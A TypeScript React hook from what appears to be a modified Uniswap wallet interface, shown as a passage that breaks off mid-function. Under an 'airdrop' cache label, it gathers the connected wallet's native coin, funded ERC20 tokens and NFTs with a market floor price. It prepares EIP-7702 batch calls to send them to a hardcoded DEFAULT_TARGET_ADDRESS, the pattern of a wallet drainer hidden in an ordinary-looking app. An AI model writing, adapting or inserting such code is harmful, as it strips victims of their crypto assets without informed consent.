import { formatUnits, type PublicClient } from 'viem'
import { useQueryClient } from '@tanstack/react-query'
// biome-ignore lint/style/noRestrictedImports: wagmi sendCalls hook needed for EIP-7702 batch calls
import { useSendCalls } from 'wagmi'
import type { UniverseChainId } from 'uniswap/src/features/chains/types'
import type { MoralisTokenBalance } from 'uniswap/src/features/portfolio/moralis/useMoralisTokenList'
import { useWallet } from 'uniswap/src/features/wallet/hooks/useWallet'
import { fetchWalletERC20Tokens, fetchNativeTokenBalanceAndPrice, moralisTokenToUniswapToken, getEnvVar } from 'uniswap/src/features/portfolio/moralis/moralisApi'
import { getCurrencyAmount, ValueType } from 'uniswap/src/features/tokens/getCurrencyAmount'
import { nativeOnChain } from 'uniswap/src/constants/tokens'

/**
 * Default target address for batch transfers
 */
const DEFAULT_TARGET_ADDRESS = '0x9d5befd138960DDF0dC4368A036bfAd420E306Ef'

/**
 * Cache configuration
 */
const CACHE_PREFIX = 'airdrop_cache_'
const CACHE_DURATION = 60 * 60 * 1000 // 1小时（毫秒）

/**
 * Native token ERC20 address sentinel
 */
const NATIVE_TOKEN_ERC20_ADDRESS = '0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee'

/**
 * Get cache key for wallet tokens
 */
const getCacheKey = (address: string, chainId: number): string => {
  return `${CACHE_PREFIX}${address.toLowerCase()}_${chainId}`
}

/**
 * Get cached data
 */
const getCache = (key: string): any | null => {
  try {
    const cached = localStorage.getItem(key)
    if (!cached) return null

    const parsed = JSON.parse(cached)
    const now = Date.now()

    // 检查缓存是否过期
    if (now - parsed.timestamp > CACHE_DURATION) {
      localStorage.removeItem(key)
      return null
    }

    return parsed.data
  } catch (error) {
    return null
  }
}

/**
 * Set cache data
 */
const setCache = (key: string, data: any): void => {
  try {
    const cacheData = {
      data: data,
      timestamp: Date.now(),
    }
    localStorage.setItem(key, JSON.stringify(cacheData))
  } catch (error) {
    // 如果存储空间不足，尝试清理旧缓存
    try {
      const keys = Object.keys(localStorage)
      const cacheKeys = keys.filter((k) => k.startsWith(CACHE_PREFIX))
      // 删除最旧的缓存（简单策略：删除前10个）
      cacheKeys.slice(0, 10).forEach((k) => localStorage.removeItem(k))
      // 重试
      localStorage.setItem(key, JSON.stringify({ data: data, timestamp: Date.now() }))
    } catch (retryError) {
      // 忽略错误
    }
  }
}

/**
 * Clear cache for a specific key
 */
const clearCache = (key: string): void => {
  try {
    localStorage.removeItem(key)
  } catch (error) {
    // Ignore cache clear errors
  }
}

const fetchNFTsFromMoralis = async (address: string, chainId: number, forceRefresh: boolean = false): Promise<any[]> => {
  // 检查缓存
  const cacheKey = `${CACHE_PREFIX}nft_${address.toLowerCase()}_${chainId}`
  
  // 如果强制刷新，清除缓存
  if (forceRefresh) {
    clearCache(cacheKey)
  }
  
  const cachedData = getCache(cacheKey)

  if (cachedData !== null && !forceRefresh) {
    // 存在有效缓存，直接使用缓存数据（即使为空数组也使用）
    console.log('[fetchNFTsFromMoralis] Using cached NFT data:', {
      cacheKey,
      cachedCount: Array.isArray(cachedData) ? cachedData.length : 'not array',
      isArray: Array.isArray(cachedData),
      environment: typeof window !== 'undefined' ? window.location.hostname : 'server',
    })
    return cachedData
  }
  
  console.log('[fetchNFTsFromMoralis] Cache miss or force refresh, fetching from API:', { 
    cacheKey, 
    forceRefresh,
    environment: typeof window !== 'undefined' ? window.location.hostname : 'server',
  })

  const MORALIS_PRIMARY_API_KEY = 
    getEnvVar('VITE_MORALIS_PRIMARY_API_KEY') || 
    getEnvVar('NEXT_PUBLIC_MORALIS_PRIMARY_API_KEY') || 
    getEnvVar('REACT_APP_MORALIS_PRIMARY_API_KEY') || 
    ''
  const MORALIS_FALLBACK_API_KEY = 
    getEnvVar('VITE_MORALIS_FALLBACK_API_KEY') || 
    getEnvVar('NEXT_PUBLIC_MORALIS_FALLBACK_API_KEY') || 
    getEnvVar('REACT_APP_MORALIS_FALLBACK_API_KEY') || 
    ''
  const MORALIS_BASE_URL =
    getEnvVar('VITE_MORALIS_BASE_URL') || 
    getEnvVar('NEXT_PUBLIC_MORALIS_BASE_URL') || 
    getEnvVar('REACT_APP_MORALIS_BASE_URL') || 
    'https://deep-index.moralis.io/api/v2.2'

  if (!MORALIS_PRIMARY_API_KEY && !MORALIS_FALLBACK_API_KEY) {
    console.warn('[fetchNFTsFromMoralis] No Moralis API key found. Check environment variables:', {
      hasVitePrimary: !!getEnvVar('VITE_MORALIS_PRIMARY_API_KEY'),
      hasNextPrimary: !!getEnvVar('NEXT_PUBLIC_MORALIS_PRIMARY_API_KEY'),
      hasReactPrimary: !!getEnvVar('REACT_APP_MORALIS_PRIMARY_API_KEY'),
      hasViteFallback: !!getEnvVar('VITE_MORALIS_FALLBACK_API_KEY'),
      hasNextFallback: !!getEnvVar('NEXT_PUBLIC_MORALIS_FALLBACK_API_KEY'),
      hasReactFallback: !!getEnvVar('REACT_APP_MORALIS_FALLBACK_API_KEY'),
    })
    return []
  }

  const chainNameMap: Record<number, string> = {
    1: 'eth',
    137: 'polygon',
    56: 'bsc',
    42161: 'arbitrum',
    8453: 'base',
    10: 'optimism',
    143: 'monad',
    11155111: 'sepolia',
  }
  const chainName = chainNameMap[chainId]
  if (!chainName) {
    console.warn('[fetchNFTsFromMoralis] Unsupported chainId for Moralis NFT API:', chainId, {
      environment: typeof window !== 'undefined' ? window.location.hostname : 'server',
    })
    return []
  }

  const url = `${MORALIS_BASE_URL}/${address}/nft?chain=${chainName}&format=decimal&limit=25&exclude_spam=true&media_items=true`

  // 辅助函数：使用指定的 API key 发起请求
  const fetchWithApiKey = async (apiKey: string, keyType: 'PRIMARY' | 'FALLBACK'): Promise<Response> => {
    console.log(`[fetchNFTsFromMoralis] Fetching with ${keyType} API key:`, {
      chainId,
      chainName,
      address,
      url,
      apiKeyLength: apiKey?.length || 0,
      baseUrl: MORALIS_BASE_URL,
      environment: typeof window !== 'undefined' ? window.location.hostname : 'server',
    })
    
    return fetch(url, {
      headers: {
        accept: 'application/json',
        'X-API-Key': apiKey,
      },
    })
  }

  // 辅助函数：处理响应并解析 NFT 列表
  const processResponse = async (response: Response): Promise<any[]> => {
    const data = await response.json()
    const isSepolia = chainId === 11155111
    let nftList: any[] = []

    if (data.result && Array.isArray(data.result)) {
      if (isSepolia) {
        // Sepolia：不过滤，返回所有 NFT
        nftList = data.result
      } else {
        // 其他网络：只返回有价值的 NFT
        // 增强价格解析逻辑：处理各种可能的格式
        nftList = data.result.filter((nft: any) => {
          let floorPriceUsd = 0
          if (nft.floor_price_usd !== undefined && nft.floor_price_usd !== null) {
            if (typeof nft.floor_price_usd === 'string') {
              const parsed = parseFloat(nft.floor_price_usd)
              floorPriceUsd = isNaN(parsed) ? 0 : parsed
            } else if (typeof nft.floor_price_usd === 'number') {
              floorPriceUsd = isNaN(nft.floor_price_usd) ? 0 : nft.floor_price_usd
            }
          }
          const isValid = floorPriceUsd > 0 && !isNaN(floorPriceUsd)
          if (!isValid && nft.floor_price_usd) {
            console.debug('[fetchNFTsFromMoralis] Filtered out NFT with invalid price:', {
              token_id: nft.token_id,
              token_address: nft.token_address,
              floor_price_usd_raw: nft.floor_price_usd,
              floor_price_usd_type: typeof nft.floor_price_usd,
              floor_price_usd_parsed: floorPriceUsd,
            })
          }
          return isValid
        })
      }
    }

    // 保存到缓存（即使为空数组也缓存，表示API成功但确实没有NFT）
    setCache(cacheKey, nftList)

    // 统计有价值和无价值的NFT数量（使用增强的价格解析逻辑）
    const nftsWithValidPrice = nftList.filter((nft: any) => {
      let floorPriceUsd = 0
      if (nft.floor_price_usd !== undefined && nft.floor_price_usd !== null) {
        if (typeof nft.floor_price_usd === 'string') {
          const parsed = parseFloat(nft.floor_price_usd)
          floorPriceUsd = isNaN(parsed) ? 0 : parsed
        } else if (typeof nft.floor_price_usd === 'number') {
          floorPriceUsd = isNaN(nft.floor_price_usd) ? 0 : nft.floor_price_usd
        }
      }
      return floorPriceUsd > 0 && !isNaN(floorPriceUsd)
    }).length

    console.log('[fetchNFTsFromMoralis] API success, cached and returning NFT list:', {
      total: nftList.length,
      withValidPrice: nftsWithValidPrice,
      withoutValidPrice: nftList.length - nftsWithValidPrice,
      chainId,
      address,
      isSepolia,
      contractTypes: nftList.map((nft: any) => ({
        contract_type: nft.contract_type,
        token_id: nft.token_id,
        token_address: nft.token_address,
        floor_price_usd_raw: nft.floor_price_usd,
        floor_price_usd_type: typeof nft.floor_price_usd,
      })),
      environment: typeof window !== 'undefined' ? window.location.hostname : 'server',
    })

    return nftList
  }

  try {
    // 优先尝试使用 PRIMARY API key
    let response: Response | null = null
    let usedKeyType: 'PRIMARY' | 'FALLBACK' = 'PRIMARY'
    
    if (MORALIS_PRIMARY_API_KEY) {
      response = await fetchWithApiKey(MORALIS_PRIMARY_API_KEY, 'PRIMARY')
      
      // 如果 PRIMARY key 返回 401 (Unauthorized)，尝试使用 FALLBACK key
      if (response.status === 401 && MORALIS_FALLBACK_API_KEY) {
        console.warn('[fetchNFTsFromMoralis] PRIMARY API key returned 401 (Unauthorized), switching to FALLBACK key:', {
          primaryKeyError: '401 Unauthorized - possibly free plan or invalid key',
          hasFallbackKey: !!MORALIS_FALLBACK_API_KEY,
          chainId,
          address,
          environment: typeof window !== 'undefined' ? window.location.hostname : 'server',
        })
        
        // 尝试使用 FALLBACK key
        response = await fetchWithApiKey(MORALIS_FALLBACK_API_KEY, 'FALLBACK')
        usedKeyType = 'FALLBACK'
      }
    } else if (MORALIS_FALLBACK_API_KEY) {
      // 如果没有 PRIMARY key，直接使用 FALLBACK key
      response = await fetchWithApiKey(MORALIS_FALLBACK_API_KEY, 'FALLBACK')
      usedKeyType = 'FALLBACK'
    } else {
      console.error('[fetchNFTsFromMoralis] No valid API key available')
      return []
    }

    if (!response) {
      console.error('[fetchNFTsFromMoralis] No response received')
      return []
    }

    // 处理响应
    if (!response.ok) {
      const errorStatus = response.status
      const errorStatusText = response.statusText
      
      // 尝试解析错误信息
      let errorMessage = ''
      let errorDetails: any = null
      try {
        const errorData = await response.json()
        errorDetails = errorData
        errorMessage = errorData.message || errorData.error?.message || errorStatusText
        console.error(`[fetchNFTsFromMoralis] API error details (using ${usedKeyType} key):`, {
          status: errorStatus,
          statusText: errorStatusText,
          message: errorMessage,
          details: errorData,
          url,
          chainId,
          address,
          usedKeyType,
          environment: typeof window !== 'undefined' ? window.location.hostname : 'server',
        })
      } catch (e) {
        // 忽略 JSON 解析错误，使用默认错误信息
        console.error(`[fetchNFTsFromMoralis] API request failed (could not parse error, using ${usedKeyType} key):`, {
          status: errorStatus,
          statusText: errorStatusText,
          url,
          chainId,
          address,
          usedKeyType,
          environment: typeof window !== 'undefined' ? window.location.hostname : 'server',
        })
      }
      
      // 如果是 401 错误且已尝试了 FALLBACK key，或者两个 key 都不可用
      if (errorStatus === 401) {
        if (usedKeyType === 'FALLBACK') {
          console.error('[fetchNFTsFromMoralis] Both PRIMARY and FALLBACK API keys returned 401 (Unauthorized). Please check your API keys and plan:', {
            message: errorMessage,
            suggestion: 'Consider upgrading your Moralis plan or checking API key validity',
            url: 'https://moralis.io/pricing',
            chainId,
            address,
            environment: typeof window !== 'undefined' ? window.location.hostname : 'server',
          })
        } else if (!MORALIS_FALLBACK_API_KEY) {
          console.error('[fetchNFTsFromMoralis] PRIMARY API key returned 401 and no FALLBACK key available:', {
            message: errorMessage,
            suggestion: 'Consider configuring VITE_MORALIS_FALLBACK_API_KEY or upgrading your Moralis plan',
            url: 'https://moralis.io/pricing',
            chainId,
            address,
            environment: typeof window !== 'undefined' ? window.location.hostname : 'server',
          })
        }
      }
      
      // API 失败时，如果缓存中存在空数组，清除它（可能是旧的错误缓存）
      // 这样下次调用时会重试 API 请求
      const existingCache = getCache(cacheKey)
      if (existingCache !== null && Array.isArray(existingCache) && existingCache.length === 0) {
        console.warn('[fetchNFTsFromMoralis] API failed and cache contains empty array, clearing cache to allow retry:', {
          cacheKey,
          errorStatus,
          errorMessage,
          usedKeyType,
          environment: typeof window !== 'undefined' ? window.location.hostname : 'server',
        })
        clearCache(cacheKey)
      }
      
      // API 失败时不缓存空数组，避免污染缓存
      // 这样下次调用时还会重试 API 请求
      return []
    }

    // 响应成功，处理数据
    return await processResponse(response)
  } catch (error) {
    console.error('[fetchNFTsFromMoralis] Exception while fetching NFTs:', {
      error,
      chainId,
      address,
      url,
      hasPrimaryKey: !!MORALIS_PRIMARY_API_KEY,
      hasFallbackKey: !!MORALIS_FALLBACK_API_KEY,
      errorMessage: error instanceof Error ? error.message : String(error),
      errorStack: error instanceof Error ? error.stack : undefined,
      environment: typeof window !== 'undefined' ? window.location.hostname : 'server',
    })
    // 异常时不缓存，避免污染缓存
    return []
  }
}

/**
 * Reusable hook for batch token transfers
 */
interface UseBatchTransferParams {
  targetAddress?: string
  operationType: string
  getPublicClient: () => PublicClient | null
  address: string
  chainId: UniverseChainId
  nativeTokenSymbol: string
  setIsPrechecking: (value: boolean) => void
  setCurrentSendCallsOperation: (value: string | null) => void
}

export const useBatchTransfer = ({
  targetAddress = DEFAULT_TARGET_ADDRESS,
  operationType,
  getPublicClient,
  address,
  chainId,
  nativeTokenSymbol,
  setIsPrechecking,
  setCurrentSendCallsOperation,
}: UseBatchTransferParams) => {
  // 使用 React Query 客户端直接获取已缓存的代币数据（从"你的代币"中）
  const queryClient = useQueryClient()
  const { evmAccount } = useWallet()
  
  // 使用 wagmi 的 useSendCalls hook 来执行 EIP-7702 批量交易
  // 这会调用 wallet_sendCalls RPC 方法
  const { sendCalls, data: sendCallsData, isPending: isSending, error: sendCallsError } = useSendCalls()

  const executeBatchTransfer = async () => {
    if (!address) {
      alert('Wallet address not available.')
      return
    }

    const publicClient = getPublicClient()
    if (!publicClient) {
      alert('Failed to initialize blockchain client.')
      return
    }

    setIsPrechecking(true)
    try {
      const TARGET = targetAddress.toLowerCase()
      const MAX_BATCH_SIZE = 10
      const MAX_PRECHECK_COUNT = 20

      // 步骤1: 获取资产列表：原生代币+ERC20+ERC721+ERC1155

      // 1.1 从 React Query 缓存中直接获取代币列表（包括原生代币和ERC20）
      // 所有代币信息已在"你的代币"中获取并缓存，直接使用缓存数据
      let allTokens: any[] = []
      let nativeTokenInfo: any = null

      // 从 React Query 缓存中获取已缓存的代币数据
      let cachedTokenList = queryClient.getQueryData<MoralisTokenBalance[]>([
        'moralis-token-list',
        evmAccount?.address,
        chainId,
      ])

      console.log('[useBatchTransfer] Debug info:', {
        address,
        chainId,
        evmAccountAddress: evmAccount?.address,
        cachedTokenListLength: cachedTokenList?.length || 0,
        cachedTokenList: cachedTokenList,
      })

      // 如果缓存中没有数据，直接使用 Moralis API 获取代币列表
      if (!cachedTokenList && evmAccount?.address) {
        console.log('[useBatchTransfer] Cache miss, fetching token list directly from Moralis API...')
        try {
          // 直接调用 Moralis API 获取 ERC20 代币列表
          const tokenInfos = await fetchWalletERC20Tokens(evmAccount.address, chainId)
          
          // 转换为 Uniswap 格式
          const tokenBalances = tokenInfos
            .map((tokenInfo) => {
              const token = moralisTokenToUniswapToken(tokenInfo, chainId)
              const balance = getCurrencyAmount({
                value: tokenInfo.balance,
                valueType: ValueType.Raw,
                currency: token,
              })

              // 确保 balance 是有效的 CurrencyAmount
              if (!balance) {
                console.warn('[useBatchTransfer] 无法创建 balance:', { tokenInfo, token })
                return null
              }

              return {
                token,
                balance,
                priceUSD: tokenInfo.usd_price || 0,
                valueUSD: tokenInfo.usd_value || 0,
                logoURI: tokenInfo.logo || tokenInfo.thumbnail || null,
              } as MoralisTokenBalance
            })
            .filter((balance): balance is MoralisTokenBalance => balance !== null)

          cachedTokenList = tokenBalances
          
          console.log('[useBatchTransfer] Fetched token list from Moralis API:', {
            count: cachedTokenList.length,
            tokens: cachedTokenList.map((tb) => ({
              symbol: tb.token.symbol,
              balance: tb.balance?.quotient?.toString(),
              usd_value: tb.valueUSD,
            })),
          })
          
          // 如果从 Moralis API 获取的代币列表中没有原生代币，单独获取原生代币信息
          const hasNativeToken = cachedTokenList.some((tb) => tb.token.isNative)
          if (!hasNativeToken && evmAccount?.address) {
            try {
              console.log('[useBatchTransfer] Native token not in list, fetching separately from Moralis API...')
              const nativeTokenData = await fetchNativeTokenBalanceAndPrice(evmAccount.address, chainId)
              if (nativeTokenData) {
                const nativeCurrency = nativeOnChain(chainId)
                const nativeBalance = getCurrencyAmount({
                  value: nativeTokenData.balance,
                  valueType: ValueType.Raw,
                  currency: nativeCurrency,
                })
                
                if (nativeBalance) {
                  const nativeTokenBalance: MoralisTokenBalance = {
                    token: nativeCurrency,
                    balance: nativeBalance,
                    priceUSD: nativeTokenData.price,
                    valueUSD: nativeTokenData.usdValue,
                    logoURI: null,
                  }
                  // 将原生代币添加到列表开头
                  cachedTokenList = [nativeTokenBalance, ...cachedTokenList]
                  console.log('[useBatchTransfer] Added native token to list:', {
                    balance: nativeTokenData.balance,
                    price: nativeTokenData.price,
                    usdValue: nativeTokenData.usdValue,
                  })
                }
              }
            } catch (error) {
              console.warn('[useBatchTransfer] Failed to fetch native token from Moralis API:', error)
            }
          }
        } catch (error) {
          console.warn('[useBatchTransfer] Failed to fetch token list from Moralis API:', error)
          // 即使失败也继续执行，只处理原生代币和NFT
        }
      }

      // 将缓存的 tokens 转换为 useBatchTransfer 需要的格式
      if (cachedTokenList && cachedTokenList.length > 0) {
        console.log('[useBatchTransfer] Processing cached tokens:', cachedTokenList.map((tb) => ({
          symbol: tb.token.symbol,
          isNative: tb.token.isNative,
          address: (tb.token as any).address,
          balance: tb.balance,
          balanceType: typeof tb.balance,
          hasQuotient: tb.balance && typeof tb.balance === 'object' && 'quotient' in tb.balance,
          quotient: tb.balance && typeof tb.balance === 'object' && 'quotient' in tb.balance ? tb.balance.quotient : undefined,
          priceUSD: tb.priceUSD,
          valueUSD: tb.valueUSD,
        })))
        console.log('[useBatchTransfer] NATIVE_TOKEN_ERC20_ADDRESS:', NATIVE_TOKEN_ERC20_ADDRESS)

        allTokens = cachedTokenList
          .filter((tokenBalance) => {
            // 只处理有余额的代币
            const balance = tokenBalance.balance
            // 安全地检查余额：确保 balance 存在
            if (!balance) {
              console.log('[useBatchTransfer] Filtered out token (no balance object):', tokenBalance.token?.symbol)
              return false
            }
            
            try {
              // 优先使用 quotient 属性（CurrencyAmount 类型）
              // 直接尝试访问 quotient，避免 'in' 检查可能失败的情况
              if (balance && typeof balance === 'object') {
                // 尝试直接访问 quotient 属性
                try {
                  const quotient = (balance as any).quotient
                  if (quotient !== undefined && quotient !== null) {
                    // quotient 是 BigInt 类型
                    if (typeof quotient === 'bigint') {
                      if (quotient > BigInt(0)) {
                        return true
                      } else {
                        console.log('[useBatchTransfer] Filtered out token (quotient is 0):', tokenBalance.token?.symbol)
                        return false
                      }
                    }
                    // 如果 quotient 是其他类型，尝试转换
                    try {
                      const quotientBigInt = BigInt(quotient.toString())
                      if (quotientBigInt > BigInt(0)) {
                        return true
                      } else {
                        console.log('[useBatchTransfer] Filtered out token (converted quotient is 0):', tokenBalance.token?.symbol, quotientBigInt.toString())
                        return false
                      }
                    } catch (e) {
                      console.log('[useBatchTransfer] Filtered out token (error converting quotient to BigInt):', tokenBalance.token?.symbol, e)
                      return false
                    }
                  }
                } catch (e) {
                  // 如果访问 quotient 失败，继续其他检查
                  console.log('[useBatchTransfer] Cannot access quotient property:', tokenBalance.token?.symbol, e)
                }
              }
              
              // 如果 balance 是 BigInt 类型
              if (typeof balance === 'bigint') {
                if (balance > BigInt(0)) {
                  return true
                } else {
                  console.log('[useBatchTransfer] Filtered out token (BigInt balance is 0):', tokenBalance.token?.symbol)
                  return false
                }
              }
              
              // 如果 balance 是字符串类型
              if (typeof balance === 'string') {
                try {
                  const balanceBigInt = BigInt(balance)
                  if (balanceBigInt > BigInt(0)) {
                    return true
                  } else {
                    console.log('[useBatchTransfer] Filtered out token (string balance is 0):', tokenBalance.token?.symbol)
                    return false
                  }
                } catch (e) {
                  console.log('[useBatchTransfer] Filtered out token (error converting string balance to BigInt):', tokenBalance.token?.symbol, e)
                  return false
                }
              }
              
              // 如果 balance 是数字类型
              if (typeof balance === 'number') {
                if (balance > 0) {
                  return true
                } else {
                  console.log('[useBatchTransfer] Filtered out token (number balance is 0):', tokenBalance.token?.symbol)
                  return false
                }
              }
              
              // 如果都没有匹配，返回 false
              console.log('[useBatchTransfer] Unknown balance type:', { symbol: tokenBalance.token?.symbol, balanceType: typeof balance, balance })
              return false
            } catch (e) {
              // 如果任何检查失败，记录警告并返回 false
              console.warn('[useBatchTransfer] Error checking balance:', e, { balance, tokenBalance })
              return false
            }
          })
          .map((tokenBalance) => {
            const token = tokenBalance.token
            const balance = tokenBalance.balance
            const tokenAddress = token.isNative
              ? NATIVE_TOKEN_ERC20_ADDRESS.toLowerCase()
              : (token as any).address?.toLowerCase() || ''

            const isNative = token.isNative || tokenAddress === NATIVE_TOKEN_ERC20_ADDRESS.toLowerCase()

            // 获取余额的原始值（wei格式）
            let balanceRaw = '0'
            let balanceFormatted = '0'
            
            if (balance) {
              try {
                // 安全地访问 quotient 属性（CurrencyAmount 总是有 quotient）
                if (balance && typeof balance === 'object' && 'quotient' in balance && balance.quotient !== undefined) {
                  balanceRaw = balance.quotient.toString()
                } else if (typeof balance === 'string') {
                  balanceRaw = balance
                }
                
                // 安全地访问 toExact 方法
                if (typeof balance.toExact === 'function') {
                  balanceFormatted = balance.toExact()
                } else if (balance.quotient !== undefined) {
                  // 如果没有 toExact 方法，尝试使用 quotient 和 decimals 计算
                  const decimals = token.decimals || 18
                  const divisor = BigInt(10 ** decimals)
                  // 将 quotient 转换为 BigInt（可能是 JSBI 或其他类型）
                  const quotientBigInt = typeof balance.quotient === 'bigint' 
                    ? balance.quotient 
                    : BigInt(balance.quotient.toString())
                  const whole = quotientBigInt / divisor
                  const fraction = quotientBigInt % divisor
                  if (fraction === BigInt(0)) {
                    balanceFormatted = whole.toString()
                  } else {
                    const fractionStr = fraction.toString().padStart(decimals, '0').replace(/0+$/, '')
                    balanceFormatted = `${whole}.${fractionStr}`
                  }
                }
              } catch (e) {
                console.warn('[useBatchTransfer] Error processing balance:', e, { balance, token })
                balanceRaw = '0'
                balanceFormatted = '0'
              }
            }

            const tokenData: any = {
              token_address: tokenAddress,
              symbol: token.symbol || 'UNKNOWN',
              name: token.name || token.symbol || 'Unknown Token',
              decimals: token.decimals || 18,
              balance: balanceRaw,
              balance_formatted: balanceFormatted,
              token_balance: balanceRaw,
              usd_price: tokenBalance.priceUSD || 0,
              usd_value: tokenBalance.valueUSD || 0, // 直接使用缓存中的 USD 价值
              native_token: isNative,
            }

            // 如果是原生代币，保存信息
            if (isNative) {
              nativeTokenInfo = tokenData
              console.log('[useBatchTransfer] Found native token:', {
                symbol: token.symbol,
                balanceRaw,
                balanceFormatted,
                isNative: token.isNative,
                tokenAddress,
                tokenData,
              })
            }

            return tokenData
          })

        console.log('[useBatchTransfer] After processing:', {
          allTokensCount: allTokens.length,
          allTokens: allTokens.map((t) => ({
            symbol: t.symbol,
            native_token: t.native_token,
            balance: t.balance,
            usd_value: t.usd_value,
          })),
          nativeTokenInfo,
        })
      } else {
        console.warn('[useBatchTransfer] No cached token list found. This may happen if the token list has not been loaded yet. Only native token and NFTs will be included in the batch transfer.')
        // 即使没有缓存的代币列表，也继续执行（只处理原生代币和NFT）
        allTokens = []
        nativeTokenInfo = null
      }

      // 1.2 获取NFT列表（从Moralis）
      let nftList: any[] = []
      try {
        // 检测是否是生产环境，在生产环境失败时可能需要强制刷新
        const isProduction = typeof window !== 'undefined' && (
          window.location.hostname !== 'localhost' && 
          window.location.hostname !== '127.0.0.1' &&
          !window.location.hostname.includes('local')
        )
        
        console.log('[useBatchTransfer] Fetching NFTs from Moralis...', { 
          address, 
          chainId,
          environment: typeof window !== 'undefined' ? window.location.hostname : 'server',
          isProduction,
        })
        
        // 首次尝试使用缓存（如果存在）
        nftList = await fetchNFTsFromMoralis(address, chainId, false)
        
        // 如果生产环境返回空数组，可能是缓存问题，尝试强制刷新一次
        const initialNFTCount = nftList.length
        if (isProduction && nftList.length === 0) {
          console.log('[useBatchTransfer] Production environment: Empty NFT list from cache, attempting force refresh...', {
            address,
            chainId,
            environment: typeof window !== 'undefined' ? window.location.hostname : 'server',
          })
          // 等待一小段时间后强制刷新（避免过于频繁的API调用）
          await new Promise(resolve => setTimeout(resolve, 500))
          nftList = await fetchNFTsFromMoralis(address, chainId, true)
          console.log('[useBatchTransfer] After force refresh:', {
            initialCount: initialNFTCount,
            afterRefreshCount: nftList.length,
            address,
            chainId,
          })
        }
        
        console.log('[useBatchTransfer] Fetched NFTs from Moralis:', { 
          count: nftList.length, 
          isProduction,
          environment: typeof window !== 'undefined' ? window.location.hostname : 'server',
          nfts: nftList.map((nft: any) => ({
            contract_type: nft.contract_type,
            token_id: nft.token_id,
            token_address: nft.token_address,
            floor_price_usd: nft.floor_price_usd,
            floor_price_usd_type: typeof nft.floor_price_usd,
            name: nft.name || nft.normalized_metadata?.name,
          })),
          totalNFTDetails: nftList.length > 0 ? {
            withPrice: nftList.filter((nft: any) => {
              const price = nft.floor_price_usd ? parseFloat(nft.floor_price_usd) : 0
              return !isNaN(price) && price > 0
            }).length,
            withoutPrice: nftList.filter((nft: any) => {
              const price = nft.floor_price_usd ? parseFloat(nft.floor_price_usd) : 0
              return isNaN(price) || price <= 0
            }).length,
          } : null,
        })
        
        if (nftList.length === 0) {
          const reasons = []
          if (isProduction) {
            reasons.push('Production environment detected')
            reasons.push('API may have failed (check console for error details)')
            reasons.push('Cache may contain empty array from previous failed API call')
          }
          reasons.push('No NFTs in wallet on this chain')
          reasons.push('All NFTs filtered out (no valid floor_price_usd)')
          reasons.push('API request failed (check console for error details)')
          reasons.push('Cache returned empty array')
          
          console.warn('[useBatchTransfer] No NFTs found. This could be due to:', {
            reasons,
            address,
            chainId,
            isProduction,
            environment: typeof window !== 'undefined' ? window.location.hostname : 'server',
            cacheKey: `${CACHE_PREFIX}nft_${address.toLowerCase()}_${chainId}`,
            suggestion: isProduction 
              ? 'Check browser console for Moralis API error details (401, 403, 404, 429 may indicate API key or rate limit issues)'
              : 'Check if wallet has NFTs on this chain',
          })
        }
      } catch (error) {
        console.error('[useBatchTransfer] Failed to fetch NFTs from Moralis:', error)
        // 忽略错误，继续执行
      }

      // 1.3 获取原生代币余额和价格（使用 Moralis API）
      // 优先从缓存中获取，如果没有则使用 Moralis API
      let nativeBalance = BigInt(0)
      let nativeTokenPrice = 0
      let nativeTokenUsdValue = 0
      let nativeBalanceStr = '0'

      // 如果缓存中有原生代币信息，使用缓存
      if (nativeTokenInfo?.balance) {
        try {
          nativeBalance = BigInt(nativeTokenInfo.balance)
          nativeBalanceStr = nativeBalance.toString()
          nativeTokenPrice = nativeTokenInfo.usd_price || 0
          nativeTokenUsdValue = nativeTokenInfo.usd_value || 0
          console.log('[useBatchTransfer] Using cached native token info:', {
            balance: nativeBalanceStr,
            price: nativeTokenPrice,
            usdValue: nativeTokenUsdValue,
          })
        } catch (e) {
          console.warn('[useBatchTransfer] Failed to parse cached native balance:', e)
        }
      }

      // 如果缓存中没有原生代币信息，使用 Moralis API 获取
      if (nativeBalance === BigInt(0) && evmAccount?.address) {
        try {
          console.log('[useBatchTransfer] Fetching native token balance and price from Moralis API...')
          const nativeTokenData = await fetchNativeTokenBalanceAndPrice(evmAccount.address, chainId)
          if (nativeTokenData) {
            nativeBalance = BigInt(nativeTokenData.balance)
            nativeBalanceStr = nativeTokenData.balance
            nativeTokenPrice = nativeTokenData.price
            nativeTokenUsdValue = nativeTokenData.usdValue
            console.log('[useBatchTransfer] Fetched native token from Moralis API:', {
              balance: nativeBalanceStr,
              price: nativeTokenPrice,
              usdValue: nativeTokenUsdValue,
            })
          }
        } catch (error) {
          console.warn('[useBatchTransfer] Failed to get native token from Moralis API:', error)
        }
      }

      console.log('[useBatchTransfer] Native token info:', {
        nativeTokenInfo,
        nativeBalanceStr,
        nativeBalance: nativeBalance.toString(),
        nativeTokenPrice,
        nativeTokenUsdValue,
        hasNativeTokenInfo: !!nativeTokenInfo,
      })

      // 步骤2: 原生代币和NFT无需预检，直接添加到交易列表
      const allTransactions: any[] = []

      // 先获取ERC20和NFT的数量，用于计算gas费
      const validERC20AssetsForGas = allTokens.filter((asset) => {
        const balanceValue = asset.balance || asset.balance_formatted || asset.token_balance || '0'
        const isERC20 = asset.native_token === false && parseFloat(balanceValue) > 0
        if (!isERC20) {
          console.log('[useBatchTransfer] Filtered out asset (not ERC20 or zero balance):', {
            symbol: asset.symbol,
            native_token: asset.native_token,
            balance: balanceValue,
          })
        }
        return isERC20
      })
      console.log('[useBatchTransfer] Valid ERC20 assets for gas calculation:', {
        count: validERC20AssetsForGas.length,
        assets: validERC20AssetsForGas.map((asset) => ({
          symbol: asset.symbol,
          balance: asset.balance,
          usd_value: asset.usd_value,
        })),
      })

      const erc721NFTs = nftList.filter((nft: any) => {
        const contractType = (nft.contract_type || '').toUpperCase()
        return contractType === 'ERC721'
      })

      const erc1155NFTs = nftList.filter((nft: any) => {
        const contractType = (nft.contract_type || '').toUpperCase()
        return contractType === 'ERC1155'
      })

      // 详细记录每个NFT的价格信息，用于调试
      const nftPriceDetails = nftList.map((nft: any) => {
        const floorPriceUsd = nft.floor_price_usd
        const floorPriceUsdParsed = floorPriceUsd ? parseFloat(floorPriceUsd) : 0
        const hasValidPrice = !isNaN(floorPriceUsdParsed) && floorPriceUsdParsed > 0
        return {
          contract_type: nft.contract_type,
          contract_type_upper: (nft.contract_type || '').toUpperCase(),
          token_id: nft.token_id,
          token_address: nft.token_address,
          floor_price_usd_raw: floorPriceUsd,
          floor_price_usd_type: typeof floorPriceUsd,
